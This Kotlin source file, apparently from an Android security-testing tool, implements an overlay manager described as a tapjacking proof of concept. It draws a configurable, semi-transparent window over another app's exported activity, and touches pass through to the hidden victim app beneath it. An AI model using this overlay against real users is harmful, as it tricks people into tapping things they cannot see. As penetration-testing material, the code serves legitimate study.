package com.androidspect.root

import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.TextView
import kotlinx.serialization.Serializable
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Manages a single persistent TYPE_APPLICATION_OVERLAY window that can be
 * repositioned, resized, recolored, and dismissed from a background thread.
 *
 * Used for TapJacking PoC: draw an overlay over a target exported activity
 * to demonstrate that touches on the victim activity can be intercepted or
 * obscured without the user's knowledge.
 *
 * Requires android.permission.SYSTEM_ALERT_WINDOW + "Display over other apps"
 * granted in Settings (canDrawOverlays = true).
 */
class OverlayManager(private val context: Context) {

    private val mainHandler = Handler(Looper.getMainLooper())
    private val wm: WindowManager by lazy {
        context.applicationContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager
    }

    // The overlay view — null when dismissed.
    @Volatile private var overlayView: View? = null
    private val shown = AtomicBoolean(false)

    fun canDraw(): Boolean = Settings.canDrawOverlays(context)

    /** Show or update the overlay with the given params. */
    fun show(params: OverlayParams) {
        mainHandler.post {
            if (!canDraw()) return@post
            val existing = overlayView
            if (existing != null) {
                // Update in-place.
                applyParams(existing, params)
                try { wm.updateViewLayout(existing, buildLayoutParams(params)) } catch (_: Exception) {}
            } else {
                val v = buildView(params)
                overlayView = v
                try {
                    wm.addView(v, buildLayoutParams(params))
                    shown.set(true)
                } catch (e: Exception) {
                    overlayView = null
                    shown.set(false)
                }
            }
        }
    }

    /** Dismiss the overlay if visible. */
    fun dismiss() {
        mainHandler.post {
            val v = overlayView ?: return@post
            try { wm.removeView(v) } catch (_: Exception) {}
            overlayView = null
            shown.set(false)
        }
    }

    fun isShown(): Boolean = shown.get()

    // ── View builder ─────────────────────────────────────────────────────────

    private fun buildView(p: OverlayParams): View {
        val frame = FrameLayout(context.applicationContext)
        applyParams(frame, p)
        return frame
    }

    private fun applyParams(v: View, p: OverlayParams) {
        val bg = safeColor(p.bgColor, Color.RED)
        val alpha = p.opacity.coerceIn(0f, 1f)
        v.setBackgroundColor(bg)
        v.alpha = alpha

        if (v is FrameLayout) {
            v.removeAllViews()
            if (p.text.isNotBlank()) {
                val tv = TextView(context.applicationContext)
                tv.text = p.text
                tv.textSize = p.textSize.coerceIn(8f, 72f)
                tv.setTextColor(safeColor(p.textColor, Color.WHITE))
                tv.gravity = Gravity.CENTER
                v.addView(tv, FrameLayout.LayoutParams(
                    FrameLayout.LayoutParams.MATCH_PARENT,
                    FrameLayout.LayoutParams.MATCH_PARENT
                ))
            }
        }
    }

    private fun buildLayoutParams(p: OverlayParams): WindowManager.LayoutParams {
        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        else
            @Suppress("DEPRECATION")
            WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

        val flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                    // FLAG_NOT_TOUCHABLE: touches pass THROUGH the overlay to the victim
                    // activity below. This is the realistic TapJacking scenario on Android
                    // 12+ — the overlay misleads the user visually while the victim app
                    // receives the actual touch events unaware it's being obscured.
                    // On Android 12+ the system enforces FLAG_NOT_TOUCHABLE on overlays
                    // that obscure other windows (when the overlay app targets API 31+),
                    // making this the only reliable mode.
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH

        return WindowManager.LayoutParams(
            dpToPx(p.widthDp.coerceIn(40, 2000)),
            dpToPx(p.heightDp.coerceIn(20, 2000)),
            p.x, p.y,
            type, flags,
            PixelFormat.TRANSLUCENT
        ).also { lp ->
            // Gravity.TOP | LEFT: x/y are offsets from the top-left corner of the screen.
            lp.gravity = Gravity.TOP or Gravity.START
        }
    }

    private fun dpToPx(dp: Int): Int =
        (dp * context.resources.displayMetrics.density + 0.5f).toInt()

    private fun safeColor(hex: String, fallback: Int): Int =
        runCatching { Color.parseColor(if (hex.startsWith("#")) hex else "#$hex") }
            .getOrDefault(fallback)
}

// ── DTOs ──────────────────────────────────────────────────────────────────────

@Serializable
data class OverlayParams(
    /** Overlay text content. */
    val text: String = "Overlay",
    /** X offset from screen left, in pixels. */
    val x: Int = 100,
    /** Y offset from screen top, in pixels. */
    val y: Int = 300,
    /** Width in dp. */
    val widthDp: Int = 200,
    /** Height in dp. */
    val heightDp: Int = 80,
    /** Background color as #RRGGBB or RRGGBB. */
    val bgColor: String = "#CC0000",
    /** Text color as #RRGGBB. */
    val textColor: String = "#FFFFFF",
    /** Text size in sp. */
    val textSize: Float = 16f,
    /** Opacity 0..1. */
    val opacity: Float = 0.85f
)
